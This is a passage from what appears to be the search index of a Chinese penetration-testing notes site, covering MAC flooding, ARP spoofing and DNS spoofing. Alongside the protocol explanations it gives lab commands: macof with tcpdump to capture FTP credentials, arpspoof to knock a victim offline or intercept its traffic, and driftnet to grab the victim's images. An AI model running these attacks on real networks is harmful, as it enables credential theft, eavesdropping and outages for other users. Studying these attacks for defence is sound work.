\u4ea4\u6362\u673a\u5728\u81ea\u5df1\u7684mac\u5730\u5740\u8868\u4e2d\u68c0\u67e5\u662f\u5426\u6709\u76ee\u6807mac\u7684\u4fe1\u606f\uff0c\u5982\u679c\u6709\u5219\u5411\u76ee\u6807mac\u63a5\u53e3\u8f6c\u53d1\u6570\u636e\u5e27\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u5c31\u4f1a\u5411\u6240\u4ee5\u975e\u6570\u636e\u6765\u6e90\u63a5\u53e3\u7684\u63a5\u53e3\u5e7f\u64ad\u8be5\u6570\u636e\u5e27\uff08mac\u6cdb\u6d2a\u653b\u51fb\u539f\u7406\uff09 \u5c40\u57df\u7f51\u5185\u4e3b\u673a\u90fd\u6536\u5230\u4e86\u6b64\u6570\u636e\u5e27\uff0c\u4f46\u53ea\u6709\u4e3b\u673aB\u4f1a\u54cd\u5e94\u8be5\u6570\u636e\u5e27\u5e76\u4e14\u56de\u5e94\uff0c\u56de\u5e94\u4fe1\u606f\u91cc\u6ce8\u660e\u4e3b\u673aB\u7684mac\u5730\u5740\u4ee5\u4fbf\u8bb0\u5f55\u5230mac\u5730\u5740\u8868\uff0c\u5176\u4ed6\u4e3b\u673a\u90fd\u4e0d\u4f1a\u6709\u53cd\u5e94\u3002 \u4ea4\u6362\u673a\u63a5\u6536\u5230\u4e3b\u673aB\u7684\u56de\u5e94\u540e\uff0c\u4f1a\u8bb0\u5f55\u5176mac \u63a5\u53e3\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u4ee5\u540eAB\u901a\u4fe1\u65f6\u4f1a\u8c03\u7528mac\u5730\u5740\u8868\u4e2d\u7684\u8bb0\u5f55\uff0c\u5b9e\u73b0\u5355\u64ad mac\u8868\u4e0earp\u7f13\u5b58\u8868\u7684\u533a\u522b mac\u8868\u8bb0\u5f55\u5728\u4ea4\u6362\u673a\u4e2d\uff0c\u7528\u4e8e\u8bb0\u5f55\u63a5\u53e3 mac\u5730\u5740\u7684\u5bf9\u5e94\u5173\u7cfb arp\u7f13\u5b58\u8868\u8bb0\u5f55\u5728\u672c\u673a\u4e2d\uff0c\u7528\u4e8e\u8bb0\u5f55IP mac\u5730\u5740\u7684\u5bf9\u5e94\u5173\u7cfb \u4ea4\u6362\u673amac\u8868\u7684\u5b66\u4e60\u673a\u5236\uff1a mac\u8868\u4e00\u822c\u90fd\u662f\u6709\u5927\u5c0f\u9650\u5236\u7684\uff0c\u4e00\u65e6mac\u8868\u6ee1\u4e86\uff0c\u5176\u4ed6mac\u5730\u5740\u5c31\u52a0\u4e0d\u8fdb\u6765\u4e86\u3002 \u4e00\u65e6\u5176\u4ed6mac\u5730\u5740\u52a0\u4e0d\u8fdb\u6765\u4e86\uff0c\u90a3\u4e48mac\u8868\u5c31\u65e0\u6cd5\u8fdb\u4e00\u6b65\u5b66\u4e60\uff0c\u4e4b\u540e\u7684\u6240\u6709\u8bf7\u6c42\u90fd\u4f1a\u88ab\u5e7f\u64ad\u5230\u5c40\u57df\u7f51\uff0c\u5b9e\u73b0\u6cdb\u6d2a\u3002 mac\u8868\u662f\u6709\u8001\u5316\u673a\u5236\u7684\uff0c\u82e5\u4ea4\u6362\u673a\u4e0e\u67d0\u53f0\u4e3b\u673a\u957f\u65f6\u95f4\u672a\u901a\u4fe1\uff0c\u4ea4\u6362\u673a\u5c31\u4f1a\u628a\u8be5\u4e3b\u673a\u7684mac\u5730\u5740\u5220\u9664\uff0c\u7b49\u4e0b\u4e00\u6b21\u901a\u4fe1\u65f6\u518d\u5b66\u4e60\u3002 \u6cdb\u6d2a\u653b\u51fb\u539f\u7406\uff1a \u6cdb\u6d2a\u653b\u51fb\u7684\u76ee\u7684\u662f\u83b7\u53d6\u4e3b\u673a\u4e4b\u95f4\u7684\u901a\u4fe1\u6570\u636e\uff0c\u8981\u8fbe\u5230\u8fd9\u4e2a\u76ee\u7684\u5219\u9700\u8981\u5f3a\u8feb\u4ea4\u6362\u673a\u628a\u63a5\u6536\u5230\u7684\u6570\u636e\u5e27\u7edf\u7edf\u5e7f\u64ad\u51fa\u6765\u3002\u6cdb\u6d2a\u653b\u51fb\u539f\u7406\u5219\u662f\u5411\u4ea4\u6362\u673a\u53d1\u9001\u5927\u91cf\u672a\u77e5mac\u5730\u5740\u8ba9\u4ea4\u6362\u673a\u4e0d\u505c\u5b66\u4e60\uff0c\u628amac\u8868\u5145\u6ee1\uff0c\u8fd9\u6837\u6b63\u5e38\u4e3b\u673amac\u5730\u5740\u8001\u5316\u540e\u5c31\u65e0\u6cd5\u518d\u6dfb\u52a0\u5230mac\u5730\u5740\u8868\u4e2d\uff0c\u4ee5\u540e\u7684\u6240\u6709\u901a\u4fe1\u6570\u636e\u90fd\u4f1a\u88ab\u5e7f\u64ad\u51fa\u6765 \u4f7f\u7528kali\u4e0a\u7684macof\u6765\u8fdb\u884c\u6cdb\u6d2a\u653b\u51fb \u76ee\u524d\u6709\u4e09\u53f0\u673a\u5668 \u6211\u4eec\u8bd5\u7740\u622a\u83b7\u7269\u7406\u673a\u767b\u5f55ftp\u670d\u52a1\u5668\u65f6\u7684\u8d26\u6237\u4e0e\u5bc6\u7801 \u5148\u4f7f\u7528\u547d\u4ee4macof\uff0c\u8ba9\u4ea4\u6362\u673a\u7684mac\u8868\u88ab\u5360\u6ee1 \u4ec5\u8f93\u5165macof\u5373\u53ef \u8f93\u5165tcpdump -nn -X -i eth0 tcp port 21\u5f00\u59cb\u6293\u5305\uff08\u5efa\u8bae\u4e0d\u7528wireshark\uff0c\u662f\u56e0\u4e3a\u540c\u4e00\u65f6\u95f4macof\u547d\u4ee4\u53d1\u51fa\u7684\u6570\u636e\u5305\u592a\u591a\u4e86\uff0c\u7528wireshark\u4f1a\u5de8\u5361\uff09 \u4e0b\u9762\u662f\u6293http\u5305 mac\u6cdb\u6d2a\u653b\u51fb\u7684\u5c40\u9650\u6027: \u53ea\u80fd\u5728\u5c40\u57df\u7f51\u5185\u653b\u51fb\u53e6\u4e00\u4e2a\u5c40\u57df\u7f51\u5185\u673a\u5668. \u4e14\u653b\u51fb\u76ee\u6807\u5fc5\u987b\u548c\u81ea\u5df1\u7528\u4ea4\u6362\u673a\u6709\u7ebf\u8fde\u63a5\u8d77\u6765 \u4e5f\u5c31\u662f\u8bf4\u4f60\u7684\u7535\u8111\u53d1\u8d77mac\u6cdb\u6d2a\u662f\u653b\u51fb\u4e0d\u5230\u4f60\u7684\u624b\u673a\u7684\u3002","title":"ARP\u6b3a\u9a97\\&DNS\u6b3a\u9a97\\&mac\u6cdb\u6d2a\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#arpdnsmac","text":"","title":"ARP\u6b3a\u9a97\\&amp;DNS\u6b3a\u9a97\\&amp;mac\u6cdb\u6d2a\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#_1","text":"arp\u534f\u8bae\u4e0e\u6b3a\u9a97 \u7b80\u5355\u6982\u8981\uff1a \u4f5c\u7528\uff1a arp\u9ad8\u901f\u7f13\u5b58\u8868\uff1a arp\u5206\u7ec4\u683c\u5f0f \u514d\u8d39arp \u4ee3\u7406arp arp\u653b\u51fb \u653b\u51fb\u539f\u7406\uff1a \u5229\u7528arspoof\u5b9e\u73b0\u65ad\u7f51\u653b\u51fb \u4f7f\u7528arpspoof\u5de5\u5177\u548cdriftnet\u5de5\u5177\u6765\u622a\u83b7\u56fe\u7247\uff0cwireshark\u6765\u76f4\u63a5\u6293\u5305 arp\u653b\u51fb\u7684\u811a\u672c\u7f16\u5199\uff1a DNS\u6b3a\u9a97 dns\u5de5\u4f5c\u539f\u7406 DNS\u6b3a\u9a97\u539f\u7406 DNS\u6b3a\u9a97\u5de5\u5177\u5b9e\u73b0 mac\u6cdb\u6d2a\u653b\u51fb \u4ea4\u6362\u673a: mac\u8868\u4e0earp\u7f13\u5b58\u8868\u7684\u533a\u522b \u4ea4\u6362\u673amac\u8868\u7684\u5b66\u4e60\u673a\u5236\uff1a \u6cdb\u6d2a\u653b\u51fb\u539f\u7406\uff1a \u4f7f\u7528kali\u4e0a\u7684macof\u6765\u8fdb\u884c\u6cdb\u6d2a\u653b\u51fb mac\u6cdb\u6d2a\u653b\u51fb\u7684\u5c40\u9650\u6027:","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#arp","text":"","title":"arp\u534f\u8bae\u4e0e\u6b3a\u9a97"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#_2","text":"\u901a\u8fc7\u6b64\u534f\u8bae\u6765\u83b7\u53d6\u5c40\u57df\u7f51\u4e2d\u67d0IP\u5730\u5740\u7684mac\u5730\u5740","title":"\u7b80\u5355\u6982\u8981\uff1a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#_3","text":"\u5728\u5c40\u57df\u7f51\u4e2d\u7684\u673a\u5668\u4e92\u76f8\u53d1\u9001\u6d88\u606f\u65f6\uff0c\u9760\u7684\u662fmac\u5730\u5740\uff08\u4e5f\u53eb\u4ee5\u592a\u7f51\u5730\u5740\uff09\u6765\u786e\u5b9a\u76ee\u7684\u5730\u5740\u7684\uff0c\u800c\u6211\u4eec\u53ea\u77e5\u9053IP\u5730\u5740\uff0c\u6240\u4ee5\u9700\u8981arp\u534f\u8bae\u6765\u628aip\u5730\u5740\u6620\u5c04\u4e3amac\u5730\u5740\u3002 \u5177\u4f53\u5b9e\u73b0\u539f\u7406\u662f\uff0c\u6bd4\u5982\u6211\u60f3\u77e5\u9053192.168.1.1\u7684mac\u5730\u5740\uff0c\u5c31\u4f1a\u5728\u5e7f\u64ad\u57df\u91cc\u5e7f\u64adarp\u8bf7\u6c42\uff0cip\u4e0d\u662f192.168.1.1\u7684\u4e3b\u673a\u4f1a\u81ea\u52a8\u5ffd\u7565\u8bf7\u6c42\uff0c\u800c192.168.1.1\u4e3b\u673a\u5219\u4f1a\u5e94\u7b54\u8bf7\u6c42\uff0c\u5e76\u8fd4\u56de\u81ea\u5df1\u7684mac\u5730\u5740(\u7531IP\u5b9a\u4f4d\u5230mac\u5730\u5740)","title":"\u4f5c\u7528\uff1a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#arp_1","text":"\u8fd9\u4e2a\u8868\u7528\u6765\u7f13\u5b58 ip\u5730\u5740\u4e0emac\u5730\u5740 \u7684\u5bf9\u5e94\u5173\u7cfb \u6709\u52a8\u6001\u8868\u548c\u9759\u6001\u8868\uff1a \u52a8\u6001\u8868\u968f\u65f6\u95f4\u7684\u63a8\u79fb\u81ea\u52a8\u6dfb\u52a0\u548c\u5220\u9664,\u6bcf\u4e2a\u52a8\u6001arp\u7f13\u5b58\u90fd\u6709\u81ea\u5df1\u7684TTL(\u751f\u5b58\u65f6\u95f4).TTL\u4e3a0\u5c31\u4f1a\u88ab\u5220 \u9759\u6001\u8868\u662f\u6c38\u4e45\u6027\u7684\uff0c\u624b\u52a8\u6dfb\u52a0\u548c\u5220\u9664\u3002 \u5c40\u57df\u7f51\u4e2dip\u5230mac\u5730\u5740\u89e3\u6790\u8fc7\u7a0b\uff1a 1.\u5f53\u7f13\u5b58\u8868\u4e2d\u5b58\u5728\u76ee\u7684IP\u5bf9\u5e94\u7684mac\u5730\u5740\u65f6 \u5219\u76f4\u63a5\u8fd4\u56de\u4e0eIP\u5bf9\u5e94\u7684mac\u5730\u5740 2.\u5f53\u7f13\u5b58\u8868\u4e2d\u6ca1\u6709\u5bf9\u5e94\u5173\u7cfb\u65f6,\u5219\u5411\u5c40\u57df\u7f51\u4e2d\u53d1\u9001arp\u5e7f\u64ad\u8bf7\u6c42\u76ee\u7684IP\u7684mac\uff0c\u6536\u5230arp\u5e94\u7b54\u540e\u5c06\u5bf9\u5e94\u5173\u7cfb\u8bb0\u5f55\u5230\u9ad8\u901f\u7f13\u5b58\u8868\u4e2d \u9ad8\u901f\u7f13\u5b58\u8868\u7684\u4f18\u7f3a\u70b9 \uff1a \u4f18\u70b9\uff1a\u51cf\u5c11\u7f51\u7edc\u901a\u4fe1\u91cf\uff0c\u63d0\u9ad8\u901a\u4fe1\u6548\u7387 \u7f3a\u70b9\uff1a\u4f1a\u9020\u6210\u5b89\u5168\u9690\u60a3","title":"arp\u9ad8\u901f\u7f13\u5b58\u8868\uff1a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#arp_2","text":"1.arp\u8bf7\u6c42\u7684\u76ee\u7684mac\u5730\u5740 \u5168f\u65f6\u4ee3\u8868\u5e7f\u64ad\u5730\u5740 2.arp\u8bf7\u6c42\u7684\u6765\u6e90mac\u5730\u5740 3.\u5b57\u6bb53 \u4ee5\u592a\u7f51\u5e27\u7c7b\u578b\u8868\u793a\u7684\u662f\u540e\u9762\u7684\u6570\u636e\u7c7b\u578b\uff0cARP\u8bf7\u6c42\u548cARP\u5e94\u7b54\u8fd9\u4e2a\u503c\u4e3a0x0806 4.\u5b57\u6bb54 \u8868\u793a\u786c\u4ef6\u5730\u5740\u7684\u7c7b\u578b\uff0c\u786c\u4ef6\u5730\u5740\u4e0d\u53ea\u4ee5\u592a\u7f51\u4e00\u79cd\uff0c\u662f\u4ee5\u592a\u7f51\u7c7b\u578b\u65f6\u6b64\u503c\u4e3a1 5.\u5b57\u6bb55 \u8868\u793a\u8981\u6620\u5c04\u7684\u534f\u8bae\u5730\u5740\u7684\u7c7b\u578b\uff0c\u8981\u5bf9IPv4\u5730\u5740\u8fdb\u884c\u6620\u5c04\uff0c\u6b64\u503c\u4e3a0x0800 67.\u5b57\u6bb56\u548c7 \u8868\u793a\u786c\u4ef6\u5730\u5740\u957f\u5ea6\u548c\u534f\u8bae\u5730\u5740\u957f\u5ea6\uff0cMAC\u5730\u5740\u53606\u5b57\u8282\uff0cIP\u5730\u5740\u53604\u5b57\u8282 8.\u64cd\u4f5c\u7c7b\u578b\u5b57\u6bb5\uff0c\u503c\u4e3a1\uff0c\u8868\u793a\u8fdb\u884cARP\u8bf7\u6c42\uff1b\u503c\u4e3a2\uff0c\u8868\u793a\u8fdb\u884cARP\u5e94\u7b54\uff1b \u503c\u4e3a3\uff0c\u8868\u793a\u8fdb\u884cRARP\u8bf7\u6c42\uff1b\u503c\u4e3a4\uff0c\u8868\u793a\u8fdb\u884cRARP\u5e94\u7b54\u3002\uff08\u91cd\u8981\uff09 9.\u5b57\u6bb59 \u53d1\u9001\u7aefARP\u8bf7\u6c42\u6216\u5e94\u7b54\u7684\u786c\u4ef6\u5730\u5740\uff0c\u8fd9\u91cc\u662f\u4ee5\u592a\u7f51\u5730\u5740\uff0c\u548c\u5b57\u6bb52\u76f8\u540c\u3002 10.\u5b57\u6bb510 \u53d1\u9001ARP\u8bf7\u6c42\u6216\u5e94\u7b54\u7684IP\u5730\u5740\u3002 11 12.\u76ee\u7684\u7aef\u7684\u786c\u4ef6\u5730\u5740\u548c\u534f\u8bae\u5730\u5740","title":"arp\u5206\u7ec4\u683c\u5f0f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#arp_3","text":"\u514d\u8d39arp\u662f\u6307\u4e3b\u673a\u53d1\u9001arp\u67e5\u627e\u81ea\u5df1\u7684IP\u5730\u5740,\u53d1\u9001\u7aef\u7684\u534f\u8bae\u5730\u5740\u548c\u76ee\u7684\u7aef\u7684\u534f\u8bae\u5730\u5740\u662f\u4e00\u81f4\u7684 \u4f5c\u7528\uff1a (\u5982\u67d0\u4e9b\u7f51\u5173\u8bbe\u5907\u4f1a\u6bcf\u9694\u4e00\u5b9a\u65f6\u95f4\u5e7f\u64ad\u4e00\u6b21\u514d\u8d39arp\uff0c\u8ba9\u7f51\u7edc\u4e2d\u5176\u4ed6\u4e3b\u673a\u66f4\u65b0arp\u7f13\u5b58\u8868\u4e2d\u7f51\u5173\u7684mac\u5730\u5740\uff0c\u7f13\u89e3arp\u653b\u51fb\u6548\u679c) (\u5982\u9ed1\u5ba2\u53ef\u4ee5\u4f7f\u7528\u514d\u8d39arp\uff0c\u5c06\u865a\u5047\u4f2a\u9020\u7684 ip mac\u5bf9\u5e94\u5173\u7cfb\u901a\u8fc7arp\u5e7f\u64ad\u51fa\u53bb\uff0c\u4f7f\u7f51\u7edc\u4e2d\u5176\u4ed6\u4e3b\u673a\u66f4\u65b0arp\u7f13\u5b58\u8868\uff0c\u66f4\u65b0\u5b8c\u6210\u540e\uff0c\u8fd9\u4e9b\u4e3b\u673a\u7684\u6570\u636e\u4f1a\u8f6c\u53d1\u5230\u9519\u8bef\u7684mac\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0arp\u6b3a\u9a97\uff09 2.\u68c0\u67e5\u5e7f\u64ad\u57df\u91cc\u7684\u5176\u4ed6\u4e3b\u673a\u6709\u6ca1\u6709\u4f7f\u7528\u81ea\u5df1\u7684IP\uff0c\u5982\u679c\u4f7f\u7528\u4e86\uff0c\u5219\u4f1a\u5f39\u51fa IP\u51b2\u7a81 \u5b57\u6837 \u514d\u8d39arp\u4e0e\u666e\u901aarp\u7684\u533a\u522b: \u666e\u901aarp\u7684\u8bf7\u6c42\u662f \u6211\u9700\u8981\u67d0ip\u7684mac\u5730\u5740\uff0c\u8be5IP\u662f\u5176\u4ed6\u673a\u5668\u7684IP\u5730\u5740 \u514d\u8d39arp\u7684\u8bf7\u6c42\u662f \u6211\u9700\u8981\u67d0IP\u7684mac\u5730\u5740\uff0c\u8be5IP\u662f\u673a\u5668\u81ea\u5df1\u7684IP\u5730\u5740\uff0c\u8d77\u5230\u5ba3\u544a\u4f5c\u7528\uff0c\u53d1\u51fa\u53bb\u540e\u662f\u4e0d\u5e0c\u671b\u5f97\u5230\u56de\u5e94\u7684\uff0c\u82e5\u6709\u56de\u5e94\u5219\u8bf4\u660e\u4e86IP\u51b2\u7a81\u4e86","title":"\u514d\u8d39arp"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#arp_4","text":"\u4ee3\u7406arp\u7684\u610f\u601d\u662f\uff0c\u4e00\u4e2a\u4e3b\u673a\u628a\u81ea\u5df1\u7684mac\u5730\u5740\u7ed9\u53e6\u4e00\u53f0\u673a\u5668\u4f7f\u7528\u6765\u5e94\u7b54\u5176\u4ed6\u4e3b\u673a\u7684arp\u8bf7\u6c42\u3002 \u5b9e\u9645\u4e0a\uff0c\u8fd9\u5df2\u7ecf\u662f\u67d0\u79cd\u610f\u4e49\u4e0a\u7684arp\u6b3a\u9a97","title":"\u4ee3\u7406arp"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#arp_5","text":"","title":"arp\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#_4","text":"arp\u653b\u51fb\u5c31\u662f\u4f2a\u9020IP\u4e0emac\u7684\u5bf9\u5e94\u5173\u7cfb\u6765\u5b9e\u73b0arp\u6b3a\u9a97\uff0c\u653b\u51fb\u8005\u53ea\u8981\u6301\u7eed\u4e0d\u65ad\u7684\u53d1\u9001\u4f2a\u9020\u7684arp\u54cd\u5e94\u5305\u5c31\u80fd\u66f4\u6539\u76ee\u6807\u4e3b\u673a\u7684arp\u7f13\u5b58\u8868\uff0c\u9020\u6210 \u65ad\u7f51\u653b\u51fb \u6216 \u4e2d\u95f4\u4eba\u653b\u51fb","title":"\u653b\u51fb\u539f\u7406\uff1a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#arspoof","text":"\u7528kali\u548c\u7269\u7406\u673a\u8fdb\u884c\u6d4b\u8bd5\uff0ckali\u662f\u653b\u51fb\u673a\uff0c\u7269\u7406\u673a\u662f\u53d7\u5bb3\u8005 \u9996\u5148\u6536\u96c6kali\uff0c\u7269\u7406\u673a\uff0c\u7f51\u5173\u7684ip\u5730\u5740\u548cmac \u5047\u8bbe\u6211\u4eec\u60f3\u8981\u5728\u5b9e\u9645\u4e2d\u5b9e\u65bd\u653b\u51fb\uff0c\u9996\u5148\u9700\u8981\u626b\u63cf\u5c40\u57df\u7f51\u4e2d\u7684IP\uff0c\u4f46\u6211\u4eec\u4e00\u4e2a\u4e00\u4e2aping\u5c31\u5f88\u6d6a\u8d39\u65f6\u95f4\u4e86\uff0c\u6240\u4ee5\u9700\u8981fping\u547d\u4ee4 \u89e3\u8bfb\u4e00\u4e0b\u547d\u4ee4 arpspoof -i kali\u7f51\u5361\u540d -t \u88ab\u653b\u51fb\u673aip \u7f51\u5173 \u597d\u7684\uff0c\u6211\u4eec\u7269\u7406\u673a\u6210\u529f\u88ab\u65ad\u7f51","title":"\u5229\u7528arspoof\u5b9e\u73b0\u65ad\u7f51\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#arpspoofdriftnetwireshark","text":"\u7136\u540e\u6211\u4eec\u6267\u884carpspoog\u6307\u4ee4 \u6b64\u65f6\u6211\u4eec\u7269\u7406\u673a\u5c31\u80fd\u8fde\u4e0a\u5916\u7f51\u4e86 \u5751\u70b9:\u5f00\u542fip\u8f6c\u53d1\u540e\u7269\u7406\u673a\u4f9d\u65e7\u4e0d\u80fd\u8fde\u4e0a\u5916\u7f51. \u6211\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\u91cd\u542f\u4e00\u4e0b\uff0c\u518d\u4fee\u6539\u4ee5\u4e0bip_forward\u6587\u4ef6\u7136\u540e\u7b49\u4e00\u4f1a\uff0c\u7269\u7406\u673a\u5c31\u53ef\u4ee5\u8fde\u4e0a\u5916\u7f51\u4e86.arp\u6b3a\u9a97\u540e\u7269\u7406\u673a\u7f51\u53ef\u80fd\u4f1a\u5361\u3002 \u6b64\u65f6\uff0c\u7269\u7406\u673a\u53d1\u7ed9\u7f51\u5173\u7684\u901a\u4fe1\u4fe1\u606f\u6211\u4eec\u90fd\u80fd\u83b7\u5f97\u5230\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u865a\u62df\u673a\u4e2d\u4f7f\u7528driftnet\u5de5\u5177\u6355\u83b7\u7269\u7406\u673a\u6b63\u5728\u6d4f\u89c8\u7684\u56fe\u7247","title":"\u4f7f\u7528arpspoof\u5de5\u5177\u548cdriftnet\u5de5\u5177\u6765\u622a\u83b7\u56fe\u7247\uff0cwireshark\u6765\u76f4\u63a5\u6293\u5305"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#arp_6","text":"arp\u653b\u51fb\u811a\u672c\u9700\u8981\u7528\u5230scapy\u5e93\u6765\u5e2e\u52a9\u6211\u4eec\u5b8c\u6210arp\u657